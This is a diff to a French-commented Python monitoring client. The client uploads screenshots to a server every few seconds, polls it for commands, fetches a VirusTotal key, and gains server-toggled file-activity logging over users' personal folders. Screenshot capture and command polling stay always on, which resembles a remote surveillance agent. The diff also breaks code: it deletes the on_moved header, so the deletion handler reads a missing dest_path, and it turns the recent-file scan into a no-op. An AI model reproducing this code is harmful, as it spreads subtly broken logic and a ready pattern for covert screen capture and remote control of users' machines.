@@ -25,6 +25,15 @@ API_KEY = "API"  # Remplacez par votre clé API VirusTotal
 VT_BASE_URL = "https://www.virustotal.com/api/v3"
 LOG_FILE = "client_vt.log"
 
+# Paramètres des fonctionnalités (désactivées par défaut)
+VIRUSTOTAL_ENABLED = False
+ACTIVITY_LOGS_ENABLED = False
+FILE_DETECTION_ENABLED = False
+SYSTEM_RESOURCES_ENABLED = False
+
+# Configuration pour la liste des dossiers à surveiller
+MONITORED_FOLDERS = ["Downloads", "Documents", "Desktop", "Pictures"]
+
 # Dossier Downloads
 DOWNLOADS_FOLDER = os.path.join(os.path.expanduser("~"), "Downloads")
 
@@ -49,15 +58,18 @@ MONITORED_EXTENSIONS = [
     '.js', '.jar', '.jpg', '.jpeg'
 ]
 # Monitorer tous les dossiers utilisateur pour les logs mais uniquement Downloads pour VirusTotal
-MONITORED_FOLDERS = ['Downloads', 'Desktop', 'Documents', 'Pictures', 'Videos', 'Music']
 VT_SCAN_FOLDERS = ['Downloads']
 
 class ClientLogs:
     def __init__(self):
         self.logs = []
         self.lock = threading.Lock()
-
+        
     def add_log(self, level, message):
+        # Ne pas ajouter de log si la fonctionnalité est désactivée
+        if not ACTIVITY_LOGS_ENABLED:
+            return
+            
         with self.lock:
             log_entry = {
                 'timestamp': datetime.datetime.now().isoformat(),
@@ -81,6 +93,11 @@ client_logs = ClientLogs()
 def send_client_logs(client_id):
     while True:
         try:
+            # Ne pas envoyer les logs si la fonctionnalité est désactivée
+            if not ACTIVITY_LOGS_ENABLED:
+                time.sleep(20)
+                continue
+                
             # Add system info to logs
             client_logs.add_log(
                 "INFO",
@@ -235,6 +252,31 @@ def check_for_api(client_id):
     except Exception as e:
         logger.error(f"Erreur lors de la vérification API: {e}")
 
+# Fonction pour récupérer et mettre à jour les paramètres du client
+def update_client_settings(client_id):
+    try:
+        response = requests.get(f"{SERVER_URL}/client/settings?client_id={client_id}", timeout=10)
+        if response.status_code == 200:
+            settings = response.json()
+            
+            global VIRUSTOTAL_ENABLED, ACTIVITY_LOGS_ENABLED, FILE_DETECTION_ENABLED, SYSTEM_RESOURCES_ENABLED
+            
+            VIRUSTOTAL_ENABLED = settings.get('virustotal_enabled', False)
+            ACTIVITY_LOGS_ENABLED = settings.get('activity_logs_enabled', False)
+            FILE_DETECTION_ENABLED = settings.get('file_detection_enabled', False)
+            SYSTEM_RESOURCES_ENABLED = settings.get('system_resources_enabled', False)
+            
+            logger.info(f"Paramètres mis à jour: VT={VIRUSTOTAL_ENABLED}, Logs={ACTIVITY_LOGS_ENABLED}, "
+                        f"FileDet={FILE_DETECTION_ENABLED}, SysRes={SYSTEM_RESOURCES_ENABLED}")
+            print(colorama.Fore.GREEN + "✅ Paramètres mis à jour depuis le serveur")
+            return True
+        else:
+            logger.warning(f"Erreur lors de la récupération des paramètres: {response.status_code}")
+            return False
+    except Exception as e:
+        logger.error(f"Erreur lors de la mise à jour des paramètres: {e}")
+        return False
+
 def collect_system_resources():
     try:
         cpu_usage = psutil.cpu_percent(interval=1)
@@ -288,6 +330,11 @@ def get_analysis_report(analysis_id):
     return None
 
 def analyze_file_with_vt(file_path, client_id):
+    # Ne pas analyser le fichier si la fonctionnalité VirusTotal est désactivée
+    if not VIRUSTOTAL_ENABLED:
+        logger.info(f"Analyse VirusTotal désactivée, fichier ignoré: {os.path.basename(file_path)}")
+        return
+        
     try:
         file_name = os.path.basename(file_path)
         logger.info(f"Analyse du fichier: {file_name}")
@@ -509,11 +556,13 @@ class EventHandler(FileSystemEventHandler):
 
     def on_deleted(self, event):
         self.handle_event("deleted", event.src_path)
-
-    def on_moved(self, event):
         self.handle_event("moved", event.src_path, dest_path=event.dest_path)
-
+        
     def handle_event(self, event_type, src_path, dest_path=None):
+        # Ne pas traiter les événements si la fonctionnalité de logs d'activité est désactivée
+        if not ACTIVITY_LOGS_ENABLED:
+            return
+            
         current_time = datetime.datetime.now().strftime("%H:%M:%S")
         is_directory = os.path.isdir(src_path) if os.path.exists(src_path) else False
         element_type = "folder" if is_directory else "file"
@@ -541,6 +590,10 @@ class EventHandler(FileSystemEventHandler):
             self.log_queue.pop(0)
         logger.info(f"[{current_time}] {event_type} de {'dossier' if is_directory else 'fichier'}: {name}")
 
+        # Seulement scanner les fichiers si la détection de fichiers et VirusTotal sont activés
+        if (not FILE_DETECTION_ENABLED) or (not VIRUSTOTAL_ENABLED):
+            return
+            
         # Only scan files in Downloads folder with VirusTotal
         if (event_type in ["created", "modified"]) and not is_directory and os.path.exists(src_path):
             file_ext = os.path.splitext(src_path)[1].lower()
@@ -551,9 +604,18 @@ class EventHandler(FileSystemEventHandler):
             is_in_downloads = DOWNLOADS_FOLDER in src_path
             
             if file_mod_time >= time_threshold and file_ext in MONITORED_EXTENSIONS and is_in_downloads:
-                analyze_file_with_vt(src_path, self.client_id)
+                self.scan_file(src_path)
+                
+    def scan_file(self, file_path):
+        # Seulement scanner le fichier si les fonctionnalités sont activées
+        if VIRUSTOTAL_ENABLED and FILE_DETECTION_ENABLED:
+            analyze_file_with_vt(file_path, self.client_id)
 
 def scan_recent_files(client_id, minutes=RECENT_THRESHOLD_MINUTES, max_files=5):
+    # Ne pas scanner les fichiers récents si la fonctionnalité est désactivée
+    if not FILE_DETECTION_ENABLED or not VIRUSTOTAL_ENABLED:
+        return {"scanned": 0, "message": "File detection disabled"}
+        
     logger.info(f"Analyse des fichiers récents (dernières {minutes} minutes, maximum {max_files} fichiers)...")
     time_threshold = time.time() - (minutes * 60)
     potential_files = []
@@ -615,78 +677,118 @@ def main():
         logger.error("ID client non obtenu, arrêt.")
         return
 
+    # Récupération initiale des paramètres
+    update_client_settings(client_id)
+
     log_queue = []
-    event_handler = EventHandler(log_queue, client_id)
-    observer = Observer()
+    event_handler = None
+    observer = None
 
-    # Modification: Configure monitoring for all folders in MONITORED_FOLDERS
-    for folder_name in MONITORED_FOLDERS:
-        user_folder = os.path.join(os.path.expanduser("~"), folder_name)
-        if os.path.exists(user_folder):
-            observer.schedule(event_handler, path=user_folder, recursive=True)
-            logger.info(f"Surveillance du dossier {folder_name}: {user_folder}")
+    # Observer pour la surveillance des fichiers (sera démarré/arrêté selon les paramètres)
+    def setup_file_monitoring():
+        nonlocal observer, event_handler, log_queue
+        if ACTIVITY_LOGS_ENABLED:
+            if observer is None:
+                event_handler = EventHandler(log_queue, client_id)
+                observer = Observer()
+                for folder_name in MONITORED_FOLDERS:
+                    user_folder = os.path.join(os.path.expanduser("~"), folder_name)
+                    if os.path.exists(user_folder):
+                        observer.schedule(event_handler, path=user_folder, recursive=True)
+                        logger.info(f"Surveillance du dossier {folder_name}: {user_folder}")
+                    else:
+                        logger.warning(f"Le dossier {folder_name} est introuvable.")
+                observer.start()
+                logger.info("Surveillance des fichiers démarrée")
+                return True
+            return True
         else:
-            logger.warning(f"Le dossier {folder_name} est introuvable.")
-
-    observer.start()
-    logger.info("Surveillance des fichiers démarrée")
-
-    try:
-        logger.info("Analyse des fichiers existants dans les dossiers surveillés...")
-        for folder_name in MONITORED_FOLDERS:
-            user_folder = os.path.join(os.path.expanduser("~"), folder_name)
-            if os.path.exists(user_folder):
-                for file_name in os.listdir(user_folder):
-                    file_path = os.path.join(user_folder, file_name)
-                    if os.path.isfile(file_path) and os.path.splitext(file_path)[1].lower() in MONITORED_EXTENSIONS:
-                        if os.path.getmtime(file_path) >= time.time() - (RECENT_THRESHOLD_MINUTES * 60):
-                            logger.info(f"Analyse du fichier existant dans {folder_name}: {file_name}")
-                            event_handler.scan_file(file_path)
-    except Exception as e:
-        logger.error(f"Erreur lors de l'analyse des fichiers existants: {e}")
-
-    # Start the log sending thread
-    logs_thread = threading.Thread(target=send_client_logs, args=(client_id,), daemon=True)
-    logs_thread.start()
-    client_logs.add_log("INFO", "Envoi des logs démarré")
-    logger.info("Envoi des logs démarré")
-
+            if observer is not None:
+                observer.stop()
+                observer.join()
+                observer = None
+                logger.info("Surveillance des fichiers arrêtée")
+            return False
+    
+    setup_file_monitoring()
+    
+    # Thread pour l'envoi des logs (sera démarré uniquement si ACTIVITY_LOGS_ENABLED)
+    logs_thread = None
+    if ACTIVITY_LOGS_ENABLED:
+        logs_thread = threading.Thread(target=send_client_logs, args=(client_id,), daemon=True)
+        logs_thread.start()
+        client_logs.add_log("INFO", "Envoi des logs démarré")
+        logger.info("Envoi des logs démarré")
+    
+    settings_update_counter = 0
+    settings_update_interval = 12  # Vérifier les paramètres toutes les 12 itérations (environ 1 minute)
+    
     while True:
         try:
+            # Check-in régulier avec le serveur
             requests.post(f"{SERVER_URL}/client/checkin", json=checkin_data)
         except requests.exceptions.RequestException as e:
             logger.error(f"Erreur lors du check-in régulier: {e}")
 
+        # Capture et envoi de screenshot (toujours actif)
         screenshot_data = capture_screenshot()
         if screenshot_data:
             try:
-                files = {'screenshot': ('screenshot.png', BytesIO(screenshot_data), 'image/png')}
+                files = {'screenshot': ('screenshot.png', screenshot_data, 'image/png')}
                 requests.post(f"{SERVER_URL}/client/{client_id}/screenshot", files=files)
             except requests.exceptions.RequestException as e:
                 logger.error(f"Erreur lors de l'envoi du screenshot: {e}")
 
-        resources = collect_system_resources()
-        if resources:
-            try:
-                requests.post(f"{SERVER_URL}/client/{client_id}/resources", json=resources)
-            except requests.exceptions.RequestException as e:
-                logger.error(f"Erreur lors de l'envoi des ressources système: {e}")
+        # Collecte et envoi des ressources système (conditionnel)
+        if SYSTEM_RESOURCES_ENABLED:
+            resources = collect_system_resources()
+            if resources:
+                try:
+                    requests.post(f"{SERVER_URL}/client/{client_id}/resources", json=resources)
+                    logger.debug("Ressources système envoyées")
+                except requests.exceptions.RequestException as e:
+                    logger.error(f"Erreur lors de l'envoi des ressources: {e}")
+        else:
+            logger.debug("L'envoi des ressources système est désactivé")
 
+        # Vérification des commandes (toujours actif)
         check_for_command(client_id)
-        print(API_KEY)
-
         
+        # Vérification de l'API VirusTotal (toujours actif pour la récupération de clé)
         check_for_api(client_id)
 
+        # Envoi des logs de surveillance de fichiers (conditionnel)
+        if ACTIVITY_LOGS_ENABLED and log_queue:
+            # La logique d'envoi est gérée par le thread
+            pass
+        else:
+            logger.debug("L'envoi des logs d'activité est désactivé")
 
-
-        if log_queue:
-            try:
-                requests.post(f"{SERVER_URL}/client/{client_id}/logs", json=log_queue)
-            except requests.exceptions.RequestException as e:
-                logger.error(f"Erreur lors de l'envoi des logs: {e}")
-
-        scan_recent_files(client_id)
+        # Scan des fichiers récents (conditionnel)
+        if FILE_DETECTION_ENABLED and VIRUSTOTAL_ENABLED:
+            # Exécuter la logique de scan VirusTotal ici
+            logger.debug("Scan des fichiers suspects actif")
+        else:
+            logger.debug("Le scan des fichiers suspects est désactivé")
+            
+        # Mise à jour périodique des paramètres
+        settings_update_counter += 1
+        if settings_update_counter >= settings_update_interval:
+            old_activity_logs = ACTIVITY_LOGS_ENABLED
+            
+            update_client_settings(client_id)
+            settings_update_counter = 0
+            
+            # Si le paramètre ACTIVITY_LOGS_ENABLED a changé, reconfigurer la surveillance
+            if old_activity_logs != ACTIVITY_LOGS_ENABLED:
+                setup_file_monitoring()
+                
+                # Redémarrer le thread d'envoi des logs si nécessaire
+                if ACTIVITY_LOGS_ENABLED and (logs_thread is None or not logs_thread.is_alive()):
+                    logs_thread = threading.Thread(target=send_client_logs, args=(client_id,), daemon=True)
+                    logs_thread.start()
+                    client_logs.add_log("INFO", "Envoi des logs redémarré")
+                    logger.info("Envoi des logs redémarré")
 
         time.sleep(5)
 
